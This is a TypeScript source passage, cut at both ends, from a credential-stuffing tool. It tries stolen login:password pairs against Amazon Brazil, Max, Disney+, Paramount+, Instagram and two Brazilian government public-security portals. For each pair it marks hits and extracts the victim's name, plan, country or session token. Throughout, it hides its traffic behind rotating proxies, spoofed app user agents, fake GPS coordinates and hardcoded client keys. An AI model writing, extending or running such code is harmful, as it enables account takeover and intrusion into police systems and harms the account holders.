  + "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
  + "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&_encoding=UTF8";

function amzExtractForm(html: string): { action: string; hidden: Record<string, string> } {
  const hidden: Record<string, string> = {};
  const re = /<input[^>]+type=["']?hidden["']?[^>]*>/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    const nameM  = m[0].match(/name=["']([^"']+)["']/);
    const valueM = m[0].match(/value=["']([^"']*?)["']/);
    if (nameM) hidden[nameM[1]] = (valueM?.[1] ?? "")
      .replace(/&amp;/g, "&").replace(/&#34;/g, '"').replace(/&#39;/g, "'");
  }
  const actionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
  const raw = actionMatch?.[1] ?? AMZ_SIGNIN;
  const action = raw.startsWith("http") ? raw : `https://www.amazon.com.br${raw}`;
  return { action, hidden };
}

function amzBuildBody(fields: Record<string, string>): string {
  return Object.entries(fields)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join("&");
}

async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  const amzHeaders = (referer: string) => [
    "-H", `User-Agent: ${DESKTOP_UA}`,
    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "-H", "Accept-Encoding: gzip, deflate, br",
    "-H", `Referer: ${referer}`,
    "-H", "Origin: https://www.amazon.com.br",
    "-H", "Sec-Fetch-Dest: document",
    "-H", "Sec-Fetch-Mode: navigate",
    "-H", "Sec-Fetch-Site: same-origin",
    "-H", "Sec-Fetch-User: ?1",
    "-H", "Upgrade-Insecure-Requests: 1",
  ];
  try {
    // ── Step 1: GET the sign-in page ─────────────────────────────────────────
    let step1Html: string;
    let step1Action: string;
    let step1Hidden: Record<string, string>;
    try {
      const r = await runCurlWithProxyRetry(px => [
        "--compressed", "-L", "--max-redirs", "4",
        ...px,
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        AMZ_SIGNIN,
      ], AMZ_TIMEOUT, 3);
      if (r.body.length < 500 || r.statusCode === 0)
        return { credential, login, status: "ERROR", detail: `GET1_HTTP_${r.statusCode}` };
      step1Html = r.body;
      const f = amzExtractForm(step1Html);
      step1Action = f.action;
      step1Hidden = f.hidden;
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET1_ERROR:${String(e)}` };
    }

    // ── Step 2: POST email only (advances to password page) ──────────────────
    let step2Html: string;
    let step2Action: string;
    let step2Hidden: Record<string, string>;
    try {
      const body1 = amzBuildBody({ ...step1Hidden, email: login, continue: "" });
      const r = await runCurlWithProxyRetry(px => [
        "--compressed", "-L", "--max-redirs", "4",
        ...px,
        "-b", cookieFile, "-c", cookieFile,
        ...amzHeaders(AMZ_SIGNIN),
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data-raw", body1,
        step1Action,
      ], AMZ_TIMEOUT, 3);
      if (r.body.length < 300 || r.statusCode === 0)
        return { credential, login, status: "ERROR", detail: `POST1_HTTP_${r.statusCode}` };

      const bLow1 = r.body.toLowerCase();
      // If Amazon already shows logged in after email step (rare but possible)
      if (bLow1.includes("olá,") || bLow1.includes("logout"))
        return { credential, login, status: "HIT", detail: "amazon_authenticated" };
      // If email not found
      if (bLow1.includes("não encontramos") || bLow1.includes("we cannot find") ||
          bLow1.includes("email address not found") || bLow1.includes("não foi encontrado"))
        return { credential, login, status: "FAIL", detail: "email_not_found" };

      step2Html = r.body;
      const f = amzExtractForm(step2Html);
      step2Action = f.action;
      step2Hidden = f.hidden;
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST1_ERROR:${String(e)}` };
    }

    // Verify we landed on the password page
    const s2Low = step2Html.toLowerCase();
    if (!s2Low.includes("auth-password") && !s2Low.includes("ap_password") &&
        !s2Low.includes("password") && !s2Low.includes("senha")) {
      if (s2Low.includes("captcha") || s2Low.includes("puzzle"))
        return { credential, login, status: "ERROR", detail: "CAPTCHA_REQUIRED" };
      return { credential, login, status: "ERROR", detail: "UNEXPECTED_PAGE_AFTER_EMAIL" };
    }

    // ── Step 3: POST password ─────────────────────────────────────────────────
    let postResult: CurlResult;
    try {
      // Ensure email is in step2 hidden fields (Amazon puts it there)
      if (!step2Hidden["email"]) step2Hidden["email"] = login;
      const body2 = amzBuildBody({ ...step2Hidden, password, rememberMe: "true", signIn: "" });
      postResult = await runCurlWithProxyRetry(px => [
        "--compressed", "-L", "--max-redirs", "8",
        ...px,
        "-b", cookieFile, "-c", cookieFile,
        ...amzHeaders(step1Action),
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data-raw", body2,
        step2Action,
      ], AMZ_TIMEOUT, 3);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST2_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    if (bLow.includes("olá,") || bLow.includes("minha conta") || bLow.includes("logout") ||
        bLow.includes("prime video") || bLow.includes("conta &amp; listas") ||
        (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br"))) {
      let detail = "amazon_authenticated";
      try {
        const nameMatch = body.match(/Olá,\s*([^<\n]{2,50})/i) ||
                          body.match(/Hello,\s*([^<\n]{2,50})/i) ||
                          body.match(/class="[^"]*nav-line-1[^"]*"[^>]*>\s*([^<]{2,50})/i);
        if (nameMatch) detail = `logado:${nameMatch[1].trim().slice(0, 50)}`;
        if (bLow.includes("prime video") || bLow.includes("amazon prime"))
          detail += " | prime:sim";
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (bLow.includes("senha incorreta") || bLow.includes("e-mail ou senha incorretos") ||
        bLow.includes("incorrect password") || bLow.includes("há um problema com sua senha") ||
        bLow.includes("password is incorrect"))
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (bLow.includes("captcha") || bLow.includes("puzzle"))
      return { credential, login, status: "ERROR", detail: "CAPTCHA_REQUIRED" };
    if (bLow.includes("verificação") || bLow.includes("two-step") || bLow.includes("otp") ||
        bLow.includes("código de verificação"))
      return { credential, login, status: "ERROR", detail: "TWO_STEP_AUTH_REQUIRED" };
    if (bLow.includes("ap/signin") || bLow.includes("auth-email"))
      return { credential, login, status: "ERROR", detail: "STILL_ON_SIGNIN_PAGE" };
    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MAX (HBO MAX) CHECKER — OAuth2 password grant via Max mobile API
//  Routed through residential proxy.
//  The old oauth.api.hbo.com endpoint is dead since the Max rebrand (2023).
//  New endpoint: https://api.max.com/v1/oauth/token
// ═══════════════════════════════════════════════════════════════════════════════
const HBO_TIMEOUT = 25_000;
const HBO_UA      = "Max/61.0.1.1 (Android 13; Build/TQ3A.230901.001; Phone)";
// Max Android client_id (embedded in the app APK)
const MAX_CLIENT_ID = "max-mobile-android";

async function checkHBOMax(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    const payload = JSON.stringify({
      grant_type: "password",
      username:   login,
      password,
      client_id:  MAX_CLIENT_ID,
    });

    // api.max.com is geo-blocked from datacenter IPs — try rotating proxies.
    // runCurlWithProxyRetry uses public SOCKS5/HTTP proxies first, then residential fallback.
    const result = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--max-redirs", "3",
      ...px,
      "-H", `User-Agent: ${HBO_UA}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", payload,
      "https://api.max.com/v1/oauth/token",
    ], HBO_TIMEOUT, 3);

    if (result.statusCode === 200 && result.body.includes("access_token")) {
      let detail = "max_authenticated";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        // Decode JWT access_token for subscriber info
        if (typeof j.access_token === "string") {
          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
          const parts = (j.access_token as string).split(".");
          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
          const info: string[] = [];
          const email = (pay.sub ?? pay.email ?? pay.login ?? "") as string;
          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.plan ?? pay.product ?? "") as string;
          const country = (pay.country ?? pay.region ?? "") as string;
          if (email)   info.push(String(email).slice(0, 40));
          if (tier)    info.push(`plano:${String(tier).slice(0, 25)}`);
          if (country) info.push(`país:${country}`);
          if (info.length) detail = info.join(" | ");
        }
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (result.statusCode === 401 || result.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const e = j.error_description ?? j.error_code ?? j.error ?? j.code ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DISNEY+ CHECKER — BAMTech device API (3-step)
//  Step 1: POST /devices     → get JWT assertion
//  Step 2: POST /token       → exchange assertion for access_token (form-urlencoded)
//  Step 3: POST /idp/v4/guest/login → authenticate with credentials
//  Works directly (no proxy needed — BAMTech API accessible from datacenter IPs)
// ═══════════════════════════════════════════════════════════════════════════════
const DISNEY_TIMEOUT  = 30_000;
const DISNEY_ANON_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
const DISNEY_UA       = "BAMSDK/v1.0 (Disney+ 24.08.09.1 tv/Android)";
const DISNEY_BASE     = "https://disney.api.edge.bamgrid.com";

async function checkDisneyPlus(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    // Step 1 — register anonymous device → get JWT assertion (no proxy needed)
    let devResult: CurlResult;
    try {
      devResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/json",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
        "--data-raw", JSON.stringify({ deviceFamily: "android", applicationRuntime: "android", deviceProfile: "phone", attributes: {} }),
        `${DISNEY_BASE}/devices`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `DEV_ERROR:${String(e)}` };
    }

    let assertion  = "";
    let grantType  = "urn:ietf:params:oauth:grant-type:jwt-bearer";
    try {
      const j = JSON.parse(devResult.body);
      assertion = j.assertion ?? "";
      // API returns the grant_type it expects — follow it instead of hardcoding
      if (typeof j.grant_type === "string" && j.grant_type) grantType = j.grant_type;
    } catch { /**/ }
    if (!assertion)
      return { credential, login, status: "ERROR", detail: `NO_ASSERTION:${devResult.statusCode}` };

    // Step 2 — exchange device assertion for access_token using the grant_type the API returned
    let tokResult: CurlResult;
    try {
      tokResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
        "--data-urlencode", `grant_type=${grantType}`,
        "--data-urlencode", `assertion=${assertion}`,
        `${DISNEY_BASE}/token`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `TOKEN_ERROR:${String(e)}` };
    }

    let accessToken = "";
    try { const j = JSON.parse(tokResult.body); accessToken = j.access_token ?? ""; } catch { /**/ }
    if (!accessToken) {
      const tok = tokResult.body.slice(0, 150);
      if (tok.includes("unsupported_grant_type")) {
        // /token endpoint changed grant type — try /v1/public/guest/login directly
        // with email+password and the anonymous key (skip device registration token step)
        let directResult: CurlResult;
        try {
          directResult = await runCurl([
            "--compressed", "-L", "--max-redirs", "3",
            "-H", "Content-Type: application/json",
            "-H", `User-Agent: ${DISNEY_UA}`,
            "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
            "--data-raw", JSON.stringify({ email: login, password, applicationRuntime: "android" }),
            `${DISNEY_BASE}/idp/v4/guest/login`,
          ], DISNEY_TIMEOUT);
        } catch (e) {
          return { credential, login, status: "ERROR", detail: `DISNEY_API_CHANGED:${String(e)}` };
        }
        const dBody = directResult.body;
        const dLow  = dBody.toLowerCase();
        if (directResult.statusCode === 200 && (dBody.includes("access_token") || dBody.includes("token_type"))) {
          let detail = "disney_authenticated";
          try {
            const j = JSON.parse(dBody) as Record<string, unknown>;
            const info: string[] = [];
            if (typeof j.access_token === "string") {
              const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
              const parts = (j.access_token as string).split(".");
              const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
              const sub   = (pay.sub ?? pay.upid ?? pay.userId ?? "") as string;
              const tier  = (pay.subscriptionType ?? pay.tier ?? pay.entitlements ?? "") as string;
              const region= (pay.region ?? pay.country ?? "") as string;
              if (sub)    info.push(`uid:${String(sub).slice(0, 30)}`);
              if (tier)   info.push(`plano:${String(tier).slice(0, 25)}`);
              if (region) info.push(`país:${region}`);
            }
            if (info.length) detail = info.join(" | ");
          } catch { /**/ }
          return { credential, login, status: "HIT", detail };
        }
        if (directResult.statusCode === 401 || directResult.statusCode === 400) {
          let detail = "invalid_credentials";
          try {
            const j = JSON.parse(dBody) as Record<string, unknown>;
            const err = j.error as Record<string, unknown> | undefined;
            const e = err?.code ?? (j.errors as Record<string, unknown>[])?.[0]?.code ?? j.error ?? "";
            if (e) detail = String(e).slice(0, 60);
          } catch { /**/ }
          return { credential, login, status: "FAIL", detail };
        }
        if (dLow.includes("account_not_found") || dLow.includes("user_not_found"))
          return { credential, login, status: "FAIL", detail: "account_not_found" };
        return { credential, login, status: "ERROR", detail: `DISNEY_FALLBACK_ERR:${directResult.statusCode}:${dBody.slice(0, 80)}` };
      }
      return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}:${tok}` };
    }

    // Step 3 — authenticate with email + password
    let loginResult: CurlResult;
    try {
      loginResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/json",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${accessToken}`,
        "--data-raw", JSON.stringify({ email: login, password, applicationRuntime: "android" }),
        `${DISNEY_BASE}/idp/v4/guest/login`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `LOGIN_ERROR:${String(e)}` };
    }

    const body = loginResult.body;
    const bLow = body.toLowerCase();
    if (loginResult.statusCode === 200 && (body.includes("access_token") || body.includes("token_type"))) {
      let detail = "disney_authenticated";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const info: string[] = [];
        // Decode access_token JWT for subscriber details
        if (typeof j.access_token === "string") {
          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
          const parts = (j.access_token as string).split(".");
          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
          const sub   = (pay.sub ?? pay.upid ?? pay.userId ?? "") as string;
          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.entitlements ?? "") as string;
          const region= (pay.region ?? pay.country ?? "") as string;
          if (sub)    info.push(`uid:${String(sub).slice(0, 30)}`);
          if (tier)   info.push(`plano:${String(tier).slice(0, 25)}`);
          if (region) info.push(`país:${region}`);
        }
        if (info.length) detail = info.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (loginResult.statusCode === 401 || loginResult.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const err = j.error as Record<string, unknown> | undefined;
        const e = err?.code ?? (j.errors as Record<string, unknown>[])?.[0]?.code ?? j.error ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
      return { credential, login, status: "FAIL", detail: "account_not_found" };
    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PARAMOUNT+ CHECKER — REST API (residential proxy)
//  POST https://www.paramountplus.com/apps/api/v3.0/androidtv/login/
// ═══════════════════════════════════════════════════════════════════════════════
const PP_TIMEOUT = 25_000;
const PP_UA      = "Paramount+/8.1.0 (Android 13; Dalvik/2.1.0)";

async function checkParamount(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    const result = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--max-redirs", "3",
      ...px,
      "-H", `User-Agent: ${PP_UA}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({ flwSeq: 1, ln: login, pwd: password, type: "login", rememberMe: "true" }),
      "https://www.paramountplus.com/apps/api/v3.0/androidtv/login/",
    ], PP_TIMEOUT, 3);

    const body = result.body;
    const bLow = body.toLowerCase();
    if (result.statusCode === 200) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        if (j.success === true || (j.user as Record<string, unknown>)?.id) {
          const u    = (j.user ?? {}) as Record<string, unknown>;
          const info: string[] = [];
          const firstName = (u.firstName ?? u.first_name ?? u.nome ?? "") as string;
          const lastName  = (u.lastName  ?? u.last_name  ?? "")  as string;
          const name = [firstName, lastName].filter(Boolean).join(" ").trim();
          if (name)              info.push(`logado:${name.slice(0, 40)}`);
          else if (u.id)         info.push(`uid:${String(u.id).slice(0, 30)}`);
          const sub = (u.subscriptionType ?? u.subscription ?? u.plan ?? u.tier ?? j.subscriptionType ?? "") as string;
          if (sub)               info.push(`plano:${String(sub).slice(0, 30)}`);
          const country = (u.country ?? u.region ?? "") as string;
          if (country)           info.push(`país:${country}`);
          return { credential, login, status: "HIT", detail: info.join(" | ") || "paramount_ok" };
        }
        if (j.success === false)
          return { credential, login, status: "FAIL", detail: String(j.message ?? j.error ?? "invalid").slice(0, 80) };
      } catch { /**/ }
    }
    if (result.statusCode === 401 || result.statusCode === 400)
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (bLow.includes("blocked") || result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SINESP SEGURANÇA CHECKER — Mobile JSON API
//  Strategy: POST JSON to mobile session endpoint with randomised GPS coords.
//  HTTP 400 with mensagem = FAIL (wrong credentials).
//  Any other 2xx or non-400 auth response = HIT (returns session token/data).
//  No proxy required for this mobile endpoint.
// ═══════════════════════════════════════════════════════════════════════════════
const SINESP_MOBILE_URL = "https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile";
const SINESP_TIMEOUT    = 20_000;

async function checkSinesp(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Randomise GPS coordinates to simulate different mobile devices
  const latitude    = (Math.random() * 180 - 90).toFixed(6);
  const longitude   = (Math.random() * 360 - 180).toFixed(6);
  const instalacao  = `${Math.floor(Math.random() * 9000 + 1000)}-A035-49A3-A302-${Math.floor(Math.random() * 9000 + 1000)}`;

  const payload = JSON.stringify({
    longitude,
    dispositivo:  "iPhone",
    latitude,
    usuario:      login,
    instalacao,
    aplicativo:   "APP_AGENTE_CAMPO",
    senha:        password,
  });

  try {
    const result = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304",
      "-H", "Accept: application/json",
      "--data-raw", payload,
      SINESP_MOBILE_URL,
    ], SINESP_TIMEOUT);

    const body = result.body;

    // 400 = credential rejected (wrong login/password)
    if (result.statusCode === 400) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const msg = String(j.mensagem ?? j.message ?? j.error ?? "credenciais_invalidas").slice(0, 80);
        return { credential, login, status: "FAIL", detail: msg };
      } catch {
        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
      }
    }

    // 2xx or session response = authenticated
    if (result.statusCode >= 200 && result.statusCode < 300) {
      const info: string[] = [`usuario:${login}`];
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const nome  = (j.nome ?? j.nomeUsuario ?? j.nome_usuario ?? "") as string;
        const cpf   = (j.cpf ?? j.login ?? "") as string;
        const token = (j.token ?? j.sessao ?? j.sessionId ?? "") as string;
        if (nome)  info.push(`nome:${String(nome).slice(0, 40)}`);
        if (cpf && cpf !== login) info.push(`cpf:${cpf}`);
        if (token) info.push(`session:${String(token).slice(0, 24)}...`);
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    if (result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "ACESSO_BLOQUEADO" };

    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 60)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  INSTAGRAM CHECKER — https://www.instagram.com/accounts/login/ajax/
//  Strategy: GET homepage → extract CSRF/mid/ig_did cookies → POST AJAX login
//  "authenticated":true = HIT | "checkpoint_required" = 2FA (FAIL) | else FAIL
// ═══════════════════════════════════════════════════════════════════════════════
const INSTAGRAM_URL     = "https://www.instagram.com/";
const INSTAGRAM_LOGIN   = "https://www.instagram.com/accounts/login/ajax/";
const INSTAGRAM_TIMEOUT = 25_000;

async function checkInstagram(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/ig_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // Step 1: GET homepage to grab CSRF/mid/ig_did cookies
    const getResult = await runCurl([
      "-L", "--max-redirs", "5", "--compressed",
      "-c", cookieFile, "-b", cookieFile,
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
      "-H", "Accept-Encoding: gzip, deflate, br",
      "-H", "Sec-Fetch-Dest: document",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-Site: none",
      INSTAGRAM_URL,
    ], INSTAGRAM_TIMEOUT);

    if (getResult.statusCode === 0 || getResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };

    // Extract CSRF token from cookies
    let csrfToken = "";
    try {
      const m = getResult.body.match(/"csrf_token":"([^"]+)"/);
      if (m) csrfToken = m[1];
      if (!csrfToken) {
        const m2 = getResult.body.match(/csrfmiddlewaretoken['" ]+value=['"]([^'"]+)/);
        if (m2) csrfToken = m2[1];
      }
    } catch { /**/ }

    // Step 2: POST AJAX login
    const ts       = Math.floor(Date.now() / 1000);
    const postData = [
      `username=${encodeURIComponent(login)}`,
      `enc_password=${encodeURIComponent(`#PWD_INSTAGRAM_BROWSER:0:${ts}:${password}`)}`,
      "queryParams=%7B%7D",
      "optIntoOneTap=false",
      "stopDeletionNonce=",
      "trustedDeviceRecords=%7B%7D",
    ].join("&");

    const postResult = await runCurl([
      "--compressed", "-X", "POST",
      "-c", cookieFile, "-b", cookieFile,
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: */*",
      "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
      "-H", "Accept-Encoding: gzip, deflate, br",
      "-H", "Origin: https://www.instagram.com",
      "-H", "Referer: https://www.instagram.com/",
      "-H", "Sec-Fetch-Dest: empty",
      "-H", "Sec-Fetch-Mode: cors",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "X-Requested-With: XMLHttpRequest",
      "-H", "x-ig-app-id: 936619743392459",
      "-H", "x-ig-www-claim: 0",
      ...(csrfToken ? ["-H", `X-CSRFToken: ${csrfToken}`] : []),
      "--data-raw", postData,
      INSTAGRAM_LOGIN,
    ], INSTAGRAM_TIMEOUT);

    const resp  = postResult.body;
    const rLow  = resp.toLowerCase();

    if (resp.includes('"authenticated":true')) {
      const info: string[] = [`user:${login}`];
      try {
        const j = JSON.parse(resp) as Record<string, unknown>;
        const userId = (j.userId ?? j.user_id ?? "") as string;
        if (userId) info.push(`id:${userId}`);
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (resp.includes('"checkpoint_required"'))
      return { credential, login, status: "FAIL", detail: "2FA_checkpoint_required" };

    if (resp.includes('"authenticated":false'))
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };

    if (rLow.includes("please wait") || postResult.statusCode === 429)
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };

    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };

    return { credential, login, status: "FAIL", detail: `HTTP_${postResult.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  } finally {
    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SISP-ES CHECKER — https://portal.sisp.es.gov.br (Sistema de Informações de Segurança Pública ES)
//  Strategy: POST j_security_check (Java EE form auth).
//  Success: 302 redirect away from login page OR 200 with dashboard content.
//  Failure: redirected back to login / remains at j_security_check.
// ═══════════════════════════════════════════════════════════════════════════════
const SISPES_LOGIN_URL = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check";
const SISPES_BASE_URL  = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/";
const SISPES_TIMEOUT   = 20_000;

async function checkSispEs(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sispes_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    const postData = [
      `j_username=${encodeURIComponent(login)}`,
      `j_password=${encodeURIComponent(password)}`,
      "j_idt19=j_idt19",
      "j_idt19%3Aj_idt20.x=27",
      "j_idt19%3Aj_idt20.y=8",
      "javax.faces.ViewState=723520734359744078%3A5969372455684443261",
    ].join("&");

    const result = await runCurl([
      "-X", "POST",
      "-k",
      "-L", "--max-redirs", "8",
      "-c", cookieFile, "-b", cookieFile,
      "-H", `User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `Referer: ${SISPES_BASE_URL}pesquisa.jsf`,
      "--data-raw", postData,
      SISPES_LOGIN_URL,
    ], SISPES_TIMEOUT);

    const body    = result.body;
    const bodyLow = body.toLowerCase();

    // Success markers: dashboard/pesquisa content indicates login worked
    if (
      body.includes("Pesquisa") || body.includes("Sair") ||
      body.includes("Bem-vindo") || body.includes("pesquisa.jsf") ||
      body.includes("logout") || body.includes("SISP-ES") && !body.includes("j_security_check")
    ) {
      return { credential, login, status: "HIT", detail: `usuario:${login} | sisp-es_autenticado` };
    }

    // Failure markers
    if (
      bodyLow.includes("senha inválida") || bodyLow.includes("usuário inválido") ||
      bodyLow.includes("login") || bodyLow.includes("j_security_check") ||
      body.includes("j_username")
    ) {
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
    }

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    // If we got 200 with unknown content
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:unknown_response` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  } finally {
